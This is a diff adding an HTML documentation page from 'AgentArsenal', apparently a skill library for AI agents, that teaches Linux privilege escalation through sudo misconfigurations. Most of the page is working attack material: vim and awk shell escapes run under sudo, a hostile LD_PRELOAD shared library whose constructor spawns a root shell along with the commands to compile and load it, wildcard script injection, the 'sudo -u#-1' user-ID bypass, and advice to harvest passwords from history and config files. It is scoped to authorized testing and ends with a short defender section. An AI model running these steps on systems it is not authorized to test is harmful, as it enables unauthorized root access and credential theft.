@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: privesc-linux-vectors-sudo-misconfigurations</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>privesc-linux-vectors-sudo-misconfigurations</h2><div class="meta"><span class="badge gray">privesc</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when authorized Linux privilege escalation hinges on sudo</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">requires:</span> <a href="privesc-linux-vectors.html">privesc-linux-vectors</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="privesc-linux.html">privesc-linux</a> <a href="privesc-linux-vectors-suid-binaries.html">privesc-linux-vectors-suid-binaries</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>sudo</td><td>1.9.x</td></tr><tr><td>linpeas</td><td>2.x</td></tr><tr><td>Python</td><td>3.12</td></tr><tr><td>gcc</td><td>13.2.0</td></tr></tbody></table><p><code>sudo -l</code> is the highest-value command in Linux privilege escalation on an authorized engagement: one misconfigured sudoers line is often a straight path to root with no exploit code and minimal noise. This sub-skill teaches systematic sudoers analysis: how to read every field of <code>sudo -l</code> output, which patterns are exploitable (NOPASSWD on scriptable binaries, wildcards, sudoedit, preserved environment variables), and how to chain partial sudo rights into full root. Scope is authorized penetration tests, labs, and CTFs only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>Run <code>sudo -l</code> and also try <code>sudo -l -U &lt;otheruser&gt;</code> if you can; save the full output including the <code>env_keep</code> and <code>secure_path</code> lines.</li>
+<li>Read <code>/etc/sudoers</code> and <code>/etc/sudoers.d/*</code> directly when readable; they reveal aliases and included files that <code>sudo -l</code> summarizes.</li>
+<li>Classify each entry: exact binary path versus wildcards, NOPASSWD versus password, target user root versus another user, argument restrictions.</li>
+<li>Check every permitted binary against GTFOBins sudo entries and test the primitive with <code>id</code> through it.</li>
+<li>Look for environment tricks: <code>LD_PRELOAD</code> permission, <code>env_keep</code> additions, <code>SETENV</code> tag, <code>sudoedit</code> entries.</li>
+<li>Exploit the quietest entry first, confirm with <code>sudo -l</code> from the new context if you land as another user, and chain upward.</li>
+</ol>
+<h2>1. Reading sudo -l output precisely</h2>
+<p>Every field matters. Capture the whole output, not just the command list.</p>
+<pre><code class="language-bash">sudo -l</code></pre>
+<p>Example output shape:</p>
+<pre><code>Matching Defaults entries for app on web01:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
+    env_keep+=&quot;LD_PRELOAD&quot;
+
+User app may run the following commands on web01:
+    (ALL) NOPASSWD: /usr/bin/vim
+    (root) /usr/bin/python3 /opt/scripts/*.py
+    (deployer) NOPASSWD: /usr/bin/systemctl restart app.service</code></pre>
+<p>Read it as an auditor: the <code>env_keep+=&quot;LD_PRELOAD&quot;</code> line combined with any sudo entry is a classic instant win. <code>(ALL) NOPASSWD: /usr/bin/vim</code> is a GTFOBins shell. The wildcard <code>/opt/scripts/*.py</code> invites argument and path tricks. The <code>(deployer)</code> entry is a stepping stone, not root, but stepping stones chain.</p>
+<h2>2. NOPASSWD binaries and GTFOBins</h2>
+<p>Any NOPASSWD entry on a binary with file write, shell escape, or library loading behavior is usually game over.</p>
+<pre><code class="language-bash">sudo /usr/bin/vim -c &#x27;:!/bin/sh&#x27;</code></pre>
+<p>Other high-value patterns: <code>less</code>, <code>more</code>, <code>man</code> (all shell out with <code>!</code>), <code>find</code> (<code>-exec</code>), <code>awk</code> (<code>system()</code>), <code>python3</code> (direct code execution), <code>vim</code>/<code>nano</code> (shell escapes and file writes), <code>tar</code>/<code>zip</code> (checkpoint features), <code>git</code> (pager escape), <code>env</code> (runs anything). Verify each candidate keeps root:</p>
+<pre><code class="language-bash">sudo /usr/bin/awk &#x27;BEGIN {system(&quot;id&quot;)}&#x27;</code></pre>
+<p>Example output shape: <code>uid=0(root) gid=0(root) groups=0(root)</code> confirms the primitive. If the sudoers entry restricts arguments (for example <code>vim /etc/app.conf</code> only), check whether the binary itself allows escapes regardless of the file argument; many do.</p>
+<h2>3. Wildcard argument injection</h2>
+<p>Wildcards in the sudoers path let you smuggle extra arguments or choose which file matches.</p>
+<pre><code class="language-bash">sudo /usr/bin/python3 /opt/scripts/*.py</code></pre>
+<p>If <code>/opt/scripts/</code> is writable, drop your own <code>evil.py</code> there; the wildcard matches it and sudo runs it as root. Even without writability, check whether any existing matched script is writable or imports a writable module. Also watch for argument injection where the entry permits flags:</p>
+<pre><code>(app) NOPASSWD: /usr/bin/tar cf /backup/*</code></pre>
+<p>Unquoted wildcards combined with tar&#x27;s checkpoint feature or <code>--use-compress-program</code> turn archiving into code execution. Always test with a harmless <code>id</code> payload first.</p>
+<h2>4. sudoedit file write primitive</h2>
+<p><code>sudoedit</code> (or <code>sudo -e</code>) entries let you edit a file as another user, which becomes arbitrary file write when the editor is escapable.</p>
+<pre><code class="language-bash">sudo -l | grep -i edit
+sudo sudoedit /etc/app/config.conf</code></pre>
+<p>Inside the editor, shell escapes (<code>:!/bin/sh</code> in vim) run as the target user. Even without escapes, editing power over files like cron scripts, service units, or <code>authorized_keys</code> converts directly to execution. Check which editor sudoedit invokes (<code>SUDO_EDITOR</code>, <code>VISUAL</code>, <code>EDITOR</code>); if you control one of those variables and the sudoers entry preserves the environment, point it at your own script.</p>
+<h2>5. LD_PRELOAD, SETENV, and env_keep abuse</h2>
+<p>These are the quietest sudo escalations because they hijack any permitted binary, even boring ones.</p>
+<pre><code class="language-bash">sudo -l | grep -iE &quot;preload|setenv|env_keep&quot;</code></pre>
+<p>If <code>env_keep</code> includes <code>LD_PRELOAD</code>, or the entry carries the <code>SETENV</code> tag, compile a hostile shared library with a constructor and preload it into any sudo invocation:</p>
+<pre><code class="language-c">#include &lt;unistd.h&gt;
+__attribute__((constructor)) void pwn(void) {
+    setuid(0); setgid(0);
+    execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;, NULL);
+}</code></pre>
+<pre><code class="language-bash">gcc -shared -fPIC -o /tmp/pwn.so pwn.c
+sudo LD_PRELOAD=/tmp/pwn.so /usr/bin/id</code></pre>
+<p>Example output shape: <code>uid=0(root) gid=0(root)</code> from a binary as dull as <code>/usr/bin/id</code>. Note that sudo sanitizes <code>LD_PRELOAD</code> by default; this only works when the configuration explicitly keeps it or grants <code>SETENV</code>.</p>
+<h2>6. Non-root targets and user ID edge cases</h2>
+<p>Entries like <code>(deployer)</code> or <code>(backup)</code> are stepping stones: become that user, then re-enumerate from the stronger position.</p>
+<pre><code class="language-bash">sudo -u deployer /usr/bin/systemctl restart app.service
+sudo -u deployer /bin/bash
+sudo -l</code></pre>
+<p>The second <code>sudo -l</code> as the new user often reveals a fresh path to root. Also check for the historic user ID confusion pattern (CVE-2019-14287): an entry like <code>(ALL, !root)</code> was bypassable with <code>sudo -u#-1</code>, and while patched in modern sudo, the pattern reminds you to test numeric UID edge cases whenever the sudoers syntax looks unusual. Verify the sudo version with <code>sudo --version</code> and match it against known sudo CVEs only as a last resort.</p>
+<h2>Edge cases</h2>
+<ul>
+<li><code>sudo -l</code> may require the user&#x27;s password; harvest it from history, config files, environment, or password reuse before assuming sudo is unavailable.</li>
+<li>Entries restricted to specific hosts (<code>web01</code> versus <code>ALL</code>) only apply where the hostname matches; check <code>hostname</code> against the sudoers host field.</li>
+<li>Command arguments in sudoers must match exactly unless wildcards are present; a trailing <code>&quot;&quot;</code> means no arguments allowed, which kills most GTFOBins one-liners for that entry.</li>
+<li><code>NOEXEC</code> tag blocks shell escapes from the permitted binary but does not block the binary&#x27;s own legitimate file writes, which can still be useful.</li>
+<li><code>sudoedit</code> follows symlinks in some configurations; a sudoedit entry on a path you can replace with a symlink may redirect the write to a privileged file.</li>
+<li>Time-based entries (<code>NOTBEFORE</code>/<code>NOTAFTER</code> in newer sudo) silently fail outside their window; check the system clock if an entry refuses to run.</li>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>If <code>sudo -l</code> shows nothing, read <code>/etc/sudoers.d/</code> and <code>/etc/sudoers</code> directly when file permissions allow; misconfigured permissions on sudoers fragments are themselves a finding.</li>
+<li>When the permitted binary has no GTFOBins entry, analyze it: <code>strings</code> for invoked commands, <code>ltrace</code> for library calls, and config files it reads may reveal a softer path.</li>
+<li>If sudo is fully locked down, pivot to the sibling sub-skills: SUID binaries and cron hijacking are the next highest-yield classes.</li>
+<li>Harvested credentials beat sudo tricks: try every found password with <code>sudo -S</code> and <code>su</code> before building exploit chains, and document the reuse.</li>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Defenders should centralize sudo logs, review sudoers with <code>visudo -c</code> and version control, avoid NOPASSWD except where strictly needed, never grant wildcards, and strip <code>LD_PRELOAD</code> from <code>env_keep</code>. sudoreplay and session logging capture what sudo users actually did. From the authorized tester side, sudo abuse is relatively quiet (it looks like legitimate admin activity in logs), but <code>LD_PRELOAD</code> constructors and unexpected child processes of sudo are detectable by EDR; keep payloads minimal and document every sudo invocation for the report&#x27;s evidence section.</p>
+<h2>Key references</h2>
+<ul>
+<li>MITRE ATT&amp;CK T1548.003 (Sudo and Sudo Caching)</li>
+<li>sudoers manual: https://www.sudo.ws/docs/man/sudoers.man</li>
+<li>GTFOBins sudo section: https://gtfobins.github.io/#+sudo</li>
+<li>CVE-2019-14287 (sudo user ID confusion): https://www.sudo.ws/security/advisories/minus_1_uid/</li>
+<li>sudo log and sudoreplay docs: https://www.sudo.ws/docs/man/sudoers.man (log_input, log_output)</li>
+<li>HackTricks sudo checklist: https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid</li>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
